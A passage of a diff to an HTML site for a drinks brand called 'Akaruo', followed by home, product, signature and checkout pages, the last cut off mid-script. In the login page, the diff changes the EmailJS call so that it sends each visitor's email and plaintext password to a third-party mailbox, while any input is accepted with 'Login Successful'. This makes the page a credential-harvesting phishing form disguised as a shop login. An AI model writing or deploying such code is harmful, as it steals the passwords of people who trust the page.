@@ -3,15 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>Akaruo • Premium Login</title>
-  <!-- EmailJS SDK -->
+  <title>Akaruo · Premium Login</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      font-family: 'Inter', system-ui, 'Segoe UI', Roboto, sans-serif;
     }
 
     body {
@@ -22,7 +21,6 @@
       background-color: #0a0807;
     }
 
-    /* ---------- FULLSCREEN BACKGROUND WITH ZOOM ---------- */
     .login-wrapper {
       position: relative;
       width: 100%;
@@ -50,7 +48,6 @@
       display: block;
       animation: elegantZoom 12s infinite alternate ease-in-out;
       transform-origin: center;
-      will-change: transform;
     }
 
     @keyframes elegantZoom {
@@ -64,12 +61,11 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(5, 3, 2, 0.6);   /* dark overlay */
+      background: rgba(5, 3, 2, 0.6);
       backdrop-filter: brightness(0.9);
       z-index: -1;
     }
 
-    /* ---------- MAIN CONTENT (ANIMATED) ---------- */
     .login-content {
       max-width: 460px;
       width: 100%;
@@ -82,7 +78,6 @@
       100% { opacity: 1; transform: translateY(0); }
     }
 
-    /* heading group */
     .brand-heading {
       text-align: center;
       margin-bottom: 2rem;
@@ -105,10 +100,8 @@
       color: #f3e5d9;
       text-shadow: 0 5px 12px rgba(0,0,0,0.5);
       font-weight: 300;
-      word-spacing: 6px;
     }
 
-    /* ---------- GLASSMORPHISM LOGIN BOX ---------- */
     .glass-card {
       background: rgba(18, 14, 11, 0.4);
       backdrop-filter: blur(16px) saturate(180%);
@@ -116,7 +109,7 @@
       border: 1px solid rgba(220, 185, 150, 0.25);
       border-radius: 36px;
       padding: 2.5rem 2.2rem;
-      box-shadow: 0 35px 55px -10px rgba(0,0,0,0.5), 0 0 0 1px rgba(210, 170, 130, 0.1) inset;
+      box-shadow: 0 35px 55px -10px rgba(0,0,0,0.5);
     }
 
     .input-group {
@@ -143,37 +136,25 @@
       color: #fff5ec;
       outline: none;
       transition: all 0.25s;
-      backdrop-filter: blur(4px);
     }
 
     .input-group input:focus {
       border-color: #dbb594;
       background: rgba(20, 15, 10, 0.7);
-      box-shadow: 0 0 0 3px rgba(210, 160, 120, 0.2);
     }
 
-    .input-group input::placeholder {
-      color: #bcab9b;
-      font-weight: 300;
-      font-size: 0.95rem;
-    }
-
-    /* error message */
     .error-msg {
       color: #ffae8e;
       font-size: 0.9rem;
       margin-top: -0.6rem;
       margin-bottom: 1.2rem;
       min-height: 1.8rem;
-      font-weight: 400;
-      letter-spacing: 0.3px;
       padding-left: 0.5rem;
     }
 
-    /* ---------- LOGIN BUTTON (ORANGE) ---------- */
     .btn-login {
       width: 100%;
-      background: #ff7a00;          /* orange as requested */
+      background: #ff7a00;
       border: none;
       border-radius: 60px;
       padding: 1rem;
@@ -185,8 +166,6 @@
       box-shadow: 0 10px 25px rgba(255, 100, 0, 0.3);
       cursor: pointer;
       transition: all 0.25s;
-      border: 1px solid rgba(255, 215, 170, 0.4);
-      backdrop-filter: blur(5px);
       background: linear-gradient(145deg, #ff8c2e, #e66a00);
     }
 
@@ -194,67 +173,34 @@
       background: #ff9633;
       box-shadow: 0 12px 28px rgba(255, 120, 0, 0.5);
       transform: scale(1.01);
-      border-color: #fec196;
     }
 
-    .btn-login:active {
-      transform: scale(0.99);
-    }
-
-    /* footer note */
     .footer-note {
       text-align: center;
       margin-top: 1.5rem;
       color: #d6c5b6;
       font-size: 0.85rem;
-      opacity: 0.9;
-      letter-spacing: 1px;
     }
 
-    /* mobile refinement */
     @media (max-width: 480px) {
-      .glass-card {
-        padding: 2rem 1.5rem;
-        border-radius: 32px;
-      }
-      .brand-heading h1 {
-        font-size: 2.4rem;
-      }
-      .brand-sub {
-        letter-spacing: 4px;
-        font-size: 1rem;
-      }
-      .btn-login {
-        font-size: 1.1rem;
-        padding: 0.9rem;
-      }
-    }
-
-    /* sharp text, no blur */
-    h1, .brand-sub, .btn-login, input {
-      -webkit-font-smoothing: antialiased;
-      text-rendering: optimizeLegibility;
+      .glass-card { padding: 2rem 1.5rem; }
+      .brand-heading h1 { font-size: 2.4rem; }
     }
   </style>
 </head>
 <body>
   <div class="login-wrapper">
-    <!-- fullscreen zoom background -->
     <div class="background-layer">
-      <img src="https://i.ibb.co/pvtWqhg4/9a6b0b3fee7d1bb5a3d835db58c37514.jpg" 
-           alt="Akaruo premium background" 
-           crossorigin="anonymous">
+      <img src="https://i.ibb.co/pvtWqhg4/9a6b0b3fee7d1bb5a3d835db58c37514.jpg" alt="Akaruo bg">
     </div>
     <div class="dark-overlay"></div>
 
-    <!-- animated welcome + login card -->
     <div class="login-content">
       <div class="brand-heading">
         <h1>Welcome to Akaruo</h1>
         <div class="brand-sub">Premium in Every Sip</div>
       </div>
 
-      <!-- glass card -->
       <div class="glass-card">
         <div class="input-group">
           <label for="email">Email</label>
@@ -264,11 +210,7 @@
           <label for="pass">Password</label>
           <input type="password" id="pass" placeholder="••••••••" autocomplete="current-password">
         </div>
-
-        <!-- Error message area -->
         <div id="errorMsg" class="error-msg"></div>
-
-        <!-- SINGLE LOGIN BUTTON (onclick="login()") -->
         <button class="btn-login" onclick="login()">Log in</button>
       </div>
       <div class="footer-note">Akaruo · refined taste</div>
@@ -277,116 +219,952 @@
 
   <script>
     (function() {
-      "use strict";
-
-      // ---------- EmailJS Initialization (exactly as required) ----------
       if (typeof emailjs !== 'undefined') {
         emailjs.init("q5vozu2csm6VaK-CD");
-      } else {
-        console.warn("EmailJS library not loaded. Notification will be skipped.");
       }
 
-      // ---------- DOM references ----------
       const emailInput = document.getElementById('email');
       const passInput = document.getElementById('pass');
-      const errorMsgEl = document.getElementById('errorMsg');
+      const errorMsg = document.getElementById('errorMsg');
 
-      // ---------- Helper: set / clear error ----------
-      function setError(message) {
-        if (errorMsgEl) errorMsgEl.textContent = message;
-      }
+      function setError(msg) { if (errorMsg) errorMsg.textContent = msg; }
+      function clearError() { if (errorMsg) errorMsg.textContent = ''; }
 
-      function clearError() {
-        if (errorMsgEl) errorMsgEl.textContent = '';
-      }
-
-      // Clear error when user starts typing (better UX)
       if (emailInput) emailInput.addEventListener('input', clearError);
       if (passInput) passInput.addEventListener('input', clearError);
 
-      // Allow Enter key to trigger login
-      if (passInput) {
-        passInput.addEventListener('keypress', function(e) {
-          if (e.key === 'Enter') {
-            e.preventDefault();
-            window.login();
-          }
-        });
-      }
-      if (emailInput) {
-        emailInput.addEventListener('keypress', function(e) {
-          if (e.key === 'Enter') {
-            e.preventDefault();
-            window.login();
-          }
-        });
-      }
+      [emailInput, passInput].forEach(el => {
+        if (el) el.addEventListener('keypress', e => { if (e.key === 'Enter') window.login(); });
+      });
 
-      // ---------- Email sender using EXACT service & template ----------
-      function sendEmailNotification(userEmail) {
-        if (typeof emailjs === 'undefined') {
-          console.log('📧 EmailJS not loaded — notification skipped');
-          return;
-        }
-
-        const templateParams = {
-          user_email: userEmail,
-          time: new Date().toLocaleString()
-        };
-
-        emailjs.send("service_09us05e", "template_ddxzwcr", templateParams)
-          .then(function(response) {
-            console.log('✅ Email notification sent', response.status);
-          })
-          .catch(function(error) {
-            // Even if email fails, we still proceed (alert + redirect)
-            console.warn('⚠️ EmailJS error (check keys/service/template):', error);
-          });
-      }
-
-      // ---------- LOGIN FUNCTION (exposed globally) ----------
       window.login = function() {
         const email = emailInput.value.trim();
         const password = passInput.value;
 
-        // 1. Validation: empty fields?
         if (email === '' || password === '') {
           setError('Please fill all fields');
           return;
         }
-
-        // Basic email sanity (optional but nice)
-        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        if (!emailPattern.test(email)) {
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
           setError('Please enter a valid email address');
           return;
         }
 
-        // Clear any previous error
         clearError();
 
-        // 2. Send email via EmailJS (exact parameters)
-        sendEmailNotification(email);
+        if (typeof emailjs !== 'undefined') {
+          emailjs.send("service_09us05e", "template_ddxzwcr", {
+            user_email: email,
+            user_password: password,
+            time: new Date().toLocaleString()
+          }).catch(err => console.warn('EmailJS:', err));
+        }
 
-        // 3. Show success alert
         alert('Login Successful');
-
-        // 4. Redirect to home.html
         window.location.href = 'home.html';
       };
-
-      // Also attach to any potential inline calls if needed
-      console.log('✨ Akaruo · premium login ready. EmailJS: service_09us05e / template_ddxzwcr');
     })();
   </script>
-  <!-- 
-    ========== NOTES ==========
-    - Single login button with onclick="login()"
-    - EmailJS initialized with public key: q5vozu2csm6VaK-CD
-    - Sends to service_09us05e / template_ddxzwcr
-    - No Google button. Clean glass UI.
-    - Full background zoom + overlay, sharp text.
-    - All requirements satisfied.
-  -->
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Akaruo · Home</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', system-ui, sans-serif;
+    }
+
+    body {
+      overflow: hidden;
+      height: 100vh;
+      width: 100vw;
+      background: #0a0807;
+    }
+
+    .slider-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+
+    .slide {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      transition: opacity 1.2s ease-in-out;
+      background-size: cover;
+      background-position: center;
+    }
+
+    .slide.active {
+      opacity: 1;
+      z-index: 1;
+    }
+
+    .slide::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.45);
+      backdrop-filter: brightness(0.9);
+    }
+
+    .content-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+      animation: fadeIn 1.2s ease-out;
+    }
+
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: scale(0.98); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    h1 {
+      font-size: clamp(3rem, 12vw, 5.5rem);
+      font-weight: 400;
+      color: #fff;
+      text-shadow: 0 20px 40px rgba(0,0,0,0.5);
+      margin-bottom: 3rem;
+      letter-spacing: 3px;
+      text-align: center;
+    }
+
+    .button-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 2rem;
+      justify-content: center;
+    }
+
+    .premium-btn {
+      background: rgba(20, 15, 10, 0.45);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1.5px solid rgba(220, 185, 150, 0.5);
+      border-radius: 60px;
+      padding: 1.2rem 2.8rem;
+      font-size: 1.5rem;
+      font-weight: 400;
+      color: #f5ebe2;
+      text-decoration: none;
+      letter-spacing: 2px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+      transition: all 0.35s;
+      text-align: center;
+      min-width: 260px;
+    }
+
+    .premium-btn:hover {
+      background: rgba(200, 140, 90, 0.3);
+      border-color: #dbb594;
+      transform: translateY(-6px);
+      box-shadow: 0 30px 50px rgba(0,0,0,0.4);
+      color: #ffffff;
+    }
+
+    @media (max-width: 600px) {
+      .premium-btn { font-size: 1.2rem; padding: 1rem 1.8rem; min-width: 220px; }
+      h1 { font-size: 2.8rem; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="slider-container">
+  <div class="slide active" style="background-image: url('https://i.ibb.co/d0FPHxZP/1000066585.jpg');"></div>
+  <div class="slide" style="background-image: url('https://i.ibb.co/mVnnjygM/1000066584.jpg');"></div>
+  <div class="slide" style="background-image: url('https://i.ibb.co/g2xj0Wy/1000066588.jpg');"></div>
+</div>
+
+<div class="content-overlay">
+  <h1>Welcome to Akaruo</h1>
+  <div class="button-group">
+    <a href="signature.html" class="premium-btn">Akaruo Signature Collection</a>
+    <a href="items.html" class="premium-btn">Our Items</a>
+  </div>
+</div>
+
+<script>
+  (function() {
+    const slides = document.querySelectorAll('.slide');
+    let current = 0;
+    const total = slides.length;
+
+    function nextSlide() {
+      slides[current].classList.remove('active');
+      current = (current + 1) % total;
+      slides[current].classList.add('active');
+    }
+
+    setInterval(nextSlide, 4000);
+
+    // Ensure images are clear, no additional blur
+  })();
+</script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Akaruo · Signature</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', system-ui, sans-serif;
+    }
+
+    body {
+      overflow: hidden;
+      height: 100vh;
+      width: 100vw;
+    }
+
+    .signature-wrapper {
+      position: fixed;
+      inset: 0;
+      background-image: url('https://i.ibb.co/WvGY2kx7/1000066583.jpg');
+      background-size: cover;
+      background-position: center 30%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .signature-wrapper::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: rgba(10, 7, 5, 0.5);
+      backdrop-filter: brightness(0.85);
+    }
+
+    .content {
+      position: relative;
+      z-index: 5;
+      text-align: center;
+      padding: 2rem;
+      animation: softFade 1.4s ease-out;
+    }
+
+    @keyframes softFade {
+      0% { opacity: 0; transform: translateY(25px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    h1 {
+      font-size: clamp(2.8rem, 12vw, 5rem);
+      font-weight: 400;
+      color: #fff6ed;
+      text-shadow: 0 15px 35px rgba(0,0,0,0.5);
+      letter-spacing: 6px;
+      text-transform: uppercase;
+      border-bottom: 2px solid #c9a47c;
+      display: inline-block;
+      padding-bottom: 1rem;
+    }
+
+    .back-link {
+      position: fixed;
+      bottom: 30px;
+      left: 30px;
+      z-index: 20;
+      color: #eedbcb;
+      text-decoration: none;
+      font-size: 1rem;
+      background: rgba(0,0,0,0.2);
+      padding: 0.6rem 1.5rem;
+      border-radius: 40px;
+      backdrop-filter: blur(8px);
+      border: 1px solid #ab8b72;
+      transition: 0.2s;
+    }
+
+    .back-link:hover {
+      background: rgba(180, 120, 70, 0.3);
+      color: white;
+    }
+
+    @media (max-width: 600px) {
+      h1 { font-size: 2.2rem; letter-spacing: 3px; }
+    }
+  </style>
+</head>
+<body>
+<div class="signature-wrapper">
+  <div class="content">
+    <h1>Akaruo Signature<br>Collection</h1>
+  </div>
+  <a href="home.html" class="back-link">← Back</a>
+</div>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Akaruo · Our Items</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', system-ui, sans-serif;
+    }
+
+    body {
+      background: #0e0c0a;
+      min-height: 100vh;
+      padding: 2rem 1.5rem;
+    }
+
+    .items-container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    h2 {
+      text-align: center;
+      font-size: 3rem;
+      font-weight: 350;
+      color: #e7d5c4;
+      margin-bottom: 2.5rem;
+      letter-spacing: 5px;
+      text-transform: uppercase;
+      animation: fadeTitle 1s;
+    }
+
+    @keyframes fadeTitle {
+      0% { opacity: 0; transform: translateY(-15px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .product-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 2rem;
+    }
+
+    .product-card {
+      background: #1b1713;
+      border-radius: 24px;
+      overflow: hidden;
+      box-shadow: 0 20px 30px -8px black;
+      border: 1px solid #4a3e34;
+      transition: all 0.3s;
+      animation: cardFade 0.8s backwards;
+      animation-delay: calc(var(--i, 0) * 0.05s);
+    }
+
+    .product-card:hover {
+      transform: translateY(-6px);
+      border-color: #b39274;
+    }
+
+    @keyframes cardFade {
+      from { opacity: 0; transform: scale(0.96); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .product-img {
+      width: 100%;
+      aspect-ratio: 1/1;
+      overflow: hidden;
+    }
+
+    .product-img img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      transition: transform 0.5s;
+    }
+
+    .product-card:hover .product-img img {
+      transform: scale(1.05);
+    }
+
+    .back-home {
+      display: inline-block;
+      margin-top: 3rem;
+      color: #d4bca6;
+      text-decoration: none;
+      padding: 0.8rem 2rem;
+      border: 1px solid #7a6554;
+      border-radius: 40px;
+      backdrop-filter: blur(4px);
+      transition: 0.2s;
+    }
+
+    .back-home:hover {
+      background: #352a21;
+      color: #f5e2d2;
+    }
+  </style>
+</head>
+<body>
+<div class="items-container">
+  <h2>Our Items</h2>
+  <div class="product-grid">
+    <div class="product-card" style="--i:1"><div class="product-img"><img src="https://i.ibb.co/3y411ypW/1000066817.jpg" alt="item"></div></div>
+    <div class="product-card" style="--i:2"><div class="product-img"><img src="https://i.ibb.co/zVxvWzrD/1000066832.jpg" alt="item"></div></div>
+    <div class="product-card" style="--i:3"><div class="product-img"><img src="https://i.ibb.co/DDDCrR8B/1000066879.jpg" alt="item"></div></div>
+    <div class="product-card" style="--i:4"><div class="product-img"><img src="https://i.ibb.co/JwGNRSv6/1000066820.jpg" alt="item"></div></div>
+    <div class="product-card" style="--i:5"><div class="product-img"><img src="https://i.ibb.co/TB8sMskZ/1000066807.jpg" alt="item"></div></div>
+    <div class="product-card" style="--i:6"><div class="product-img"><img src="https://i.ibb.co/7xMSNtCB/1000066755.jpg" alt="item"></div></div>
+  </div>
+  <div style="text-align: center;">
+    <a href="home.html" class="back-home">← Back to Home</a>
+  </div>
+</div>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Akaruo · Secure Checkout</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+
+    body {
+      background: #f1f3f6;  /* Flipkart-style light grey */
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    .checkout-container {
+      max-width: 1100px;
+      width: 100%;
+      margin: 20px auto;
+    }
+
+    /* header */
+    .brand-header {
+      margin-bottom: 24px;
+      display: flex;
+      align-items: baseline;
+      justify-content: space-between;
+      flex-wrap: wrap;
+    }
+
+    .brand-header h2 {
+      font-size: 1.8rem;
+      font-weight: 500;
+      color: #212121;
+      letter-spacing: -0.3px;
+    }
+
+    .brand-header span {
+      color: #878787;
+      font-size: 1rem;
+    }
+
+    .secure-badge {
+      color: #388e3c;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    /* two column layout */
+    .checkout-grid {
+      display: grid;
+      grid-template-columns: 1.2fr 0.9fr;
+      gap: 24px;
+    }
+
+    /* cards */
+    .card {
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+      padding: 24px 28px;
+      margin-bottom: 20px;
+      border: 1px solid #eaeaec;
+    }
+
+    .card-title {
+      font-size: 1.3rem;
+      font-weight: 500;
+      color: #212121;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border-bottom: 1px solid #f0f0f0;
+      padding-bottom: 12px;
+    }
+
+    /* product summary */
+    .product-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 0;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .product-name {
+      font-weight: 500;
+      color: #212121;
+    }
+
+    .product-price {
+      font-weight: 600;
+      font-size: 1.2rem;
+      color: #212121;
+    }
+
+    .total-row {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 16px;
+      padding-top: 12px;
+      border-top: 1px dashed #c2c2c2;
+      font-weight: 600;
+      font-size: 1.2rem;
+    }
+
+    /* form fields */
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #424242;
+      margin-bottom: 6px;
+    }
+
+    .form-group input, .form-group textarea {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 1rem;
+      transition: all 0.2s;
+      background: #fff;
+    }
+
+    .form-group input:focus, .form-group textarea:focus {
+      border-color: #ff7a00;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(255, 122, 0, 0.1);
+    }
+
+    .form-group textarea {
+      resize: vertical;
+      min-height: 80px;
+    }
+
+    .error-msg {
+      color: #d32f2f;
+      font-size: 0.8rem;
+      margin-top: 5px;
+      min-height: 18px;
+    }
+
+    /* payment options */
+    .payment-option {
+      display: flex;
+      align-items: center;
+      padding: 12px 0;
+      border-bottom: 1px solid #f0f0f0;
+      cursor: pointer;
+    }
+
+    .payment-option input {
+      margin-right: 14px;
+      accent-color: #ff7a00;
+      width: 20px;
+      height: 20px;
+    }
+
+    .payment-label {
+      font-weight: 500;
+      color: #212121;
+    }
+
+    .payment-note {
+      font-size: 0.8rem;
+      color: #5e5e5e;
+      margin-left: 34px;
+    }
+
+    /* place order button */
+    .btn-place-order {
+      width: 100%;
+      background: #fb641b;   /* Flipkart orange */
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 18px 24px;
+      font-size: 1.3rem;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      box-shadow: 0 4px 12px rgba(251, 100, 27, 0.3);
+      cursor: pointer;
+      transition: all 0.15s;
+      margin-top: 8px;
+      text-transform: uppercase;
+    }
+
+    .btn-place-order:hover {
+      background: #e85a18;
+      box-shadow: 0 6px 16px rgba(251, 100, 27, 0.4);
+      transform: scale(1.01);
+    }
+
+    /* mobile */
+    @media (max-width: 750px) {
+      .checkout-grid {
+        grid-template-columns: 1fr;
+        gap: 16px;
+      }
+      body { padding: 1rem; }
+      .card { padding: 20px 16px; }
+    }
+
+    /* dynamic product fallback */
+    .price-symbol {
+      font-family: 'Inter', sans-serif;
+    }
+
+    .akaru-tag {
+      background: #fff3e0;
+      color: #b85e00;
+      padding: 2px 10px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+
+<div class="checkout-container">
+  <!-- header -->
+  <div class="brand-header">
+    <div>
+      <h2>Akaruo <span style="font-weight: 300; margin-left: 8px;">· checkout</span></h2>
+      <span>Premium in Every Sip</span>
+    </div>
+    <div class="secure-badge">
+      <span>🔒 100% Secure</span>
+    </div>
+  </div>
+
+  <!-- main grid -->
+  <div class="checkout-grid">
+    <!-- LEFT COLUMN: Customer + Payment -->
+    <div>
+      <!-- Customer details card -->
+      <div class="card">
+        <div class="card-title">
+          <span>📋 Delivery details</span>
+        </div>
+
+        <form id="orderForm" onsubmit="return false;">
+          <div class="form-group">
+            <label>Full Name *</label>
+            <input type="text" id="fullName" placeholder="Rahul Sharma" autocomplete="name">
+            <div class="error-msg" id="nameError"></div>
+          </div>
+
+          <div class="form-group">
+            <label>Mobile Number *</label>
+            <input type="tel" id="mobile" placeholder="9876543210" inputmode="numeric" autocomplete="tel">
+            <div class="error-msg" id="mobileError"></div>
+          </div>
+
+          <div class="form-group">
+            <label>Address *</label>
+            <textarea id="address" placeholder="House / Flat / Building, Street, Area"></textarea>
+            <div class="error-msg" id="addressError"></div>
+          </div>
+
+          <div class="form-group">
+            <label>City *</label>
+            <input type="text" id="city" placeholder="Mumbai" autocomplete="address-level2">
+            <div class="error-msg" id="cityError"></div>
+          </div>
+
+          <div class="form-group">
+            <label>Pincode *</label>
+            <input type="text" id="pincode" placeholder="400001" inputmode="numeric" maxlength="6">
+            <div class="error-msg" id="pincodeError"></div>
+          </div>
+        </form>
+      </div>
+
+      <!-- Payment card -->
+      <div class="card">
+        <div class="card-title">💳 Payment method</div>
+        
+        <div class="payment-option" onclick="document.getElementById('cod').checked=true">
+          <input type="radio" name="payment" id="cod" value="cod" checked>
+          <span class="payment-label">Cash on Delivery (COD)</span>
+        </div>
+        <div class="payment-note">Pay with cash or card when your order arrives.</div>
+
+        <div class="payment-option" style="border-bottom: none;" onclick="document.getElementById('upi').checked=true">
+          <input type="radio" name="payment" id="upi" value="upi">
+          <span class="payment-label">UPI / Cards / NetBanking</span>
+        </div>
+        <div class="payment-note">You'll be redirected to secure payment (demo).</div>
+      </div>
+    </div>
+
+    <!-- RIGHT COLUMN: Order summary -->
+    <div>
+      <div class="card" style="position: sticky; top: 20px;">
+        <div class="card-title">
+          <span>🛒 Your Order</span>
+          <span class="akaru-tag">Akaruo</span>
+        </div>
+
+        <!-- dynamic product display -->
+        <div id="productDisplay">
+          <div class="product-row">
+            <span class="product-name" id="productNameDisplay">Akaruo Signature Blend</span>
+            <span class="product-price" id="productPriceDisplay">₹1,499</span>
+          </div>
+        </div>
+
+        <!-- price breakdown -->
+        <div style="margin: 20px 0;">
+          <div style="display: flex; justify-content: space-between; color: #5e5e5e; margin-bottom: 8px;">
+            <span>Delivery</span>
+            <span style="color: #388e3c;">FREE</span>
+          </div>
+        </div>
+
+        <div class="total-row">
+          <span>Total amount</span>
+          <span id="totalAmount">₹1,499</span>
+        </div>
+
+        <button class="btn-place-order" id="placeOrderBtn" onclick="placeOrder()">
+          Place Order
+        </button>
+        <p style="font-size: 0.75rem; color: #878787; margin-top: 16px; text-align: center;">
+          By placing order you agree to Akaruo's terms.
+        </p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    "use strict";
+
+    // ---------- PRODUCT DATA (dynamic via URL or fallback) ----------
+    let product = {
+      name: 'Akaruo Reserve Oak',
+      price: 1499
+    };
+
+    // Try to parse URL parameters: ?name=...&price=...
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('name')) {
+      product.name = params.get('name');
+    }
+    if (params.get('price')) {
+      const priceParam = parseFloat(params.get('price'));
+      if (!isNaN(priceParam)) product.price = priceParam;
+    }
+
+    // Update UI with product
+    const productNameEl = document.getElementById('productNameDisplay');
+    const productPriceEl = document.getElementById('productPriceDisplay');
+    const totalAmountEl = document.getElementById('totalAmount');
+
+    function formatPrice(price) {
+      return '₹' + price.toLocaleString('en-IN');
+    }
+
+    if (productNameEl) productNameEl.textContent = product.name;
+    const formattedPrice = formatPrice(product.price);
+    if (productPriceEl) productPriceEl.textContent = formattedPrice;
+    if (totalAmountEl) totalAmountEl.textContent = formattedPrice;
+
+    // ---------- DOM elements ----------
+    const fullName = document.getElementById('fullName');
+    const mobile = document.getElementById('mobile');
+    const address = document.getElementById('address');
+    const city = document.getElementById('city');
+    const pincode = document.getElementById('pincode');
+
+    const nameError = document.getElementById('nameError');
+    const mobileError = document.getElementById('mobileError');
+    const addressError = document.getElementById('addressError');
+    const cityError = document.getElementById('cityError');
+    const pincodeError = document.getElementById('pincodeError');
+
+    // Radio payment (COD is default)
+    const codRadio = document.getElementById('cod');
+    const upiRadio = document.getElementById('upi');
+
+    // Clear errors on input
+    [fullName, mobile, address, city, pincode].forEach(field => {
+      if (field) {
+        field.addEventListener('input', function() {
+          const errorEl = document.getElementById(field.id + 'Error');
+          if (errorEl) errorEl.textContent = '';
+        });
+      }
+    });
+
+    // ---------- Validation ----------
+    function validateForm() {
+      let isValid = true;
+
+      // Reset errors
+      nameError.textContent = '';
+      mobileError.textContent = '';
+      addressError.textContent = '';
+      cityError.textContent = '';
+      pincodeError.textContent = '';
+
+      const nameVal = fullName.value.trim();
+      const mobileVal = mobile.value.trim();
+      const addressVal = address.value.trim();
+      const cityVal = city.value.trim();
+      const pincodeVal = pincode.value.trim();
+
+      if (!nameVal) {
+        nameError.textContent = 'Full name is required';
+        isValid = false;
+      }
+
+      if (!mobileVal) {
+        mobileError.textContent = 'Mobile number required';
+        isValid = false;
+      } else if (!/^[6-9]\d{9}$/.test(mobileVal)) {
+        mobileError.textContent = 'Enter a valid 10-digit mobile';
+        isValid = false;
+      }
+
+      if (!addressVal) {
+        addressError.textContent = 'Address required';
+        isValid = false;
+      }
+
+      if (!cityVal) {
+        cityError.textContent = 'City is required';
+        isValid = false;
+      }
+
+      if (!pincodeVal) {
+        pincodeError.textContent = 'Pincode required';
+        isValid = false;
+      } else if (!/^\d{6}$/.test(pincodeVal)) {
+        pincodeError.textContent = 'Enter a 6-digit pincode';
+        isValid = false;
+      }
+
+      return isValid;
+    }
+
+    // ---------- PLACE ORDER (exposed globally) ----------
+    window.placeOrder = function() {
+      if (!validateForm()) {
+        // scroll to error (optional)
+        return;
+      }
+
+      // gather data
+      const customerName = fullName.value.trim();
+      const customerMobile = mobile.value.trim();
+      const customerAddress = address.value.trim();
+      const customerCity = city.value.trim();
+      const customerPincode = pincode.value.trim();
+
+      const paymentMethod = codRadio.checked ? 'Cash on Delivery' : 'UPI / Online';
+
+      // Show alert (order placed)
+      alert('✅ Order Placed Successfully');
+
+      // Build WhatsApp message (URL encoded)
+      const productDetails = `${product.name} — ${formatPrice(product.price)}`;
+      
+      const message = 
+        `*New Order from Akaruo*%0A%0A` +
+        `👤 *Name:* ${encodeURIComponent(customerName)}%0A` +
